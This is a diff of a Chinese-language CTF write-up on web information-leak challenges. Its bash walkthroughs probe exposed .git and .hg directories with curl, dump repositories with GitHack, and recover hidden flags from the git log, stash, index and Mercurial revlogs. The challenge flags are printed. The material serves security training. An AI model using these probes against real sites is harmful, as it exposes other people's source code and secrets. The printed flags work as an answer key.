@@ -1,8 +1,8 @@
-# CTF 实战训练报告 · task9
+# task9
 
 # 第一章 环境安装（0.5 day）
 
-## 1.3 基础 Linux 命令（本次实战高频用到）
+## 1.3 基础 Linux 命令
 
 ### 1.3.1 目录与文件列举
 - **`ls`**
@@ -129,53 +129,115 @@ ctfhub{d5b85603ca77329a3ae5a18}   Git 历史
 
 ## 2.2 五类信息泄露
 
-### 2.2.1 Git 泄露
+### 2.2.1 四道仓库泄露题
 
-**成因**：在 web 目录执行 `git clone` / `git pull` 部署，`.git` 留在 web 根。
+> 四道题的**命令就是解法**。每段代码照抄即可复现，注释里标了每一步在干什么。
 
-**`.git` 里有什么：**
-
-- **全部源码（每个版本）**
-  - 位置：`objects/`
-  - 危害：完整源码
-- **全部提交历史**
-  - 位置：`objects/` + `refs/`
-  - 危害：开发过程、注释里的密码
-- **未提交改动**
-  - 位置：`index`
-  - 危害：暂存区敏感文件
-- **被"藏起来"的改动**
-  - 位置：`refs/stash`
-  - 危害：连 commit 都没进
-- **被"删掉"的东西**
-  - 位置：`objects/` + `logs/`
-  - 危害：`git rm` 删不掉对象
-
-**四种变体与判据：**
-
-- ****Log****
-  - 判据：reflog 有 `remove flag`
-  - 提取命令：`git show <add flag 的哈希>`
-- ****Stash****
-  - 判据：`refs/stash` 200 / reflog 有 `reset`
-  - 提取命令：`git stash show -p`
-- ****Index****
-  - 判据：index 与 HEAD 的 blob 差集非空
-  - 提取命令：`git diff --cached`
-- ****未删****
-  - 判据：reflog 只有 `init → add flag`
-  - 提取命令：`ls` + `cat`
-
-**四条命令兜底（下载后各打一遍）：**
+#### 题目 1 · Git Log（`.git` 泄露）
 
 ```bash
-ls && cat *.txt                       # 未删变体
-git log --all -p | grep -i ctfhub     # Log
-git stash show -p                     # Stash
-git diff --cached                     # Index
+T="http://challenge-41019ce7441deaee.sandbox.ctfhub.com:10800/"
+curl -s "$T/.git/HEAD"              # ref: refs/heads/master
+curl -s "$T/.git/logs/HEAD"         # ← 关键的一步
+cd ~/tools/githack/GitHack-master
+python2 GitHack.py "$T/.git"
+cd dist/challenge-41019ce7441deaee.sandbox.ctfhub.com_10800
+git show 4d330484
 ```
 
-**万能兜底（不判断题型，扫全部对象）：**
+**判据**：`logs/HEAD` 里出现 `commit: add flag` 和 `commit: remove flag` 两行 → 取 `add flag` 那一行的第二列哈希，`git show` 它。
+
+**flag**：`ctfhub{dc8b0894d5a5689a22a35ffe}`
+
+#### 题目 2 · Git Stash
+
+```bash
+curl -s "$T/.git/HEAD"              # ref: refs/heads/master
+curl -s "$T/.git/logs/HEAD"         # 4 条 ← 注意比上一题多一行
+cd ~/tools/githack/GitHack-master
+python2 GitHack.py "$T/.git"
+cd dist/challenge-f853c2afa0df69bb.sandbox.ctfhub.com_10800
+ls                                   # 50x.html  index.html
+```
+
+**判据**：reflog 变成 4 条，多出来的那行是 `reset: moving to HEAD`；`refs/stash` 返回 200。
+
+**补一条取 flag**：
+
+```bash
+git stash show -p
+```
+
+**flag**：`ctfhub{03f0f3f844084d7134cedad3}`
+
+#### 题目 3 · Git Index
+
+```bash
+T="http://challenge-xxx:10800"
+
+# ────────── 探测（4 条）──────────
+curl -s "$T/.git/HEAD"                                          # ① 是 git 吗
+curl -s "$T/.git/logs/HEAD" | sed 's/.*\t//'                    # ② 看剧情
+curl -s -o /dev/null -w "%{http_code}\n" "$T/.git/refs/stash"   # ③ 有 stash 吗
+curl -s -o /dev/null -w "%{http_code}\n" "$T/.git/objects/"     # ④ 403→GitHack / 200→wget
+
+# ────────── 搬运（2 条）──────────
+python2 ~/tools/githack/GitHack-master/GitHack.py "$T/.git/"
+cd ~/tools/githack/GitHack-master/dist/$(ls -t ~/tools/githack/GitHack-master/dist/ | head -1)
+
+# ────────── 挖（4 条全打，5 秒）──────────
+ls && cat *.txt
+git log --all -p | grep -i ctfhub
+git stash show -p
+git diff --cached
+```
+
+**判据**：`git diff --cached` 有输出 = index 里有 HEAD 没有的文件（flag 从没被 commit 过）。
+
+**flag**：本地复刻 `flag{index_staged_never_committed}`（CTFHub 该实例未留记录）
+
+#### 题目 4 · HG（Mercurial）
+
+```bash
+T="http://challenge-xxx:10800"
+
+# ① 探测
+
+# ② 拿文件名（dirstate 里 strings）
+curl -s "$T/.hg/dirstate" | strings | grep -E '\.(txt|php|py)$'
+
+# ③ 关键：名字里的 _ 变成 __
+#    flag_807728508.txt  →  flag__807728508.txt
+
+# ④ 取内容 + 抓 flag
+curl -s "$T/.hg/store/data/flag__807728508.txt.i" | grep -ao 'ctfhub{[^}]*}'
+```
+
+**判据**：`/.hg/requires` 返回 200。
+
+**两个关键**：文件名里的 `_` 要写成 `__`；revlog 首字节 `'u'`(0x75) 表示是原文不是 zlib。
+
+**flag**：`ctfhub{9260b70ead69a60fb2e0d968}`
+
+#### 补充：`.git` 里到底有什么
+
+- 全部源码（每个版本）
+  位置：`objects/`
+  危害：完整源码
+- 全部提交历史
+  位置：`objects/` + `refs/`
+  危害：开发过程、注释里的密码
+- 未提交改动
+  位置：`index`
+  危害：暂存区敏感文件
+- 被"藏起来"的改动
+  位置：`refs/stash`
+  危害：连 commit 都没进
+- 被"删掉"的东西
+  位置：`objects/` + `logs/`
+  危害：`git rm` 删不掉对象
+
+#### 补充：万能兜底（不判断题型，扫全部对象）
 
 ```bash
 git cat-file --batch-all-objects --batch-check='%(objecttype) %(objectname)' \
@@ -185,6 +247,7 @@ git cat-file --batch-all-objects --batch-check='%(objecttype) %(objectname)' \
       [ -n "$c" ] && echo "★ $h → $c"
     done
 ```
+
 
 ### 2.2.2 备份文件下载
 
@@ -243,7 +306,7 @@ for h in $(sqlite3 wc.db "SELECT checksum FROM PRISTINE;" | sed 's/\$sha1\$//');
 done | grep -a ctfhub
 ```
 
-### 2.2.4 HG（Mercurial）泄露
+### 2.2.4 HG 补充细节（题目 4 的延伸）
 
 **成因**：在 web 目录 `hg clone` / `hg pull`。
 
